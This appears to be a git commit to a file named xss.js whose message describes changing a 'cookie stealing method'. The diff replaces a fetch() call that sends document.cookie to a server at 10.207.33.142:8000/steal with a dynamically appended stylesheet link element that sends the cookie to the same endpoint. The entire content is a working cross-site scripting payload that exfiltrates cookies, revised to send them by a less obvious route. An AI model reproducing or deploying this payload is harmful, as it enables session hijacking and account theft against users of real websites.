e5684bd2c220ac959a380ba079661068eb22a6a9
TrishaSrikanth-459 <73068694+TrishaSrikanth-459@users.noreply.github.com>
2026-02-26 18:42:32 -0500

    Modify cookie stealing method using link element
    Changed fetch call to dynamically create and append a link element for stealing cookies.

--- xss.js
+++ xss.js
@@ -1,1 +1,4 @@
-fetch('http://10.207.33.142:8000/steal?cookie=' + document.cookie)
+var link = document.createElement('link');
+link.rel = 'stylesheet';
+link.href = 'http://10.207.33.142:8000/steal?cookie=' + document.cookie;
+document.head.appendChild(link);
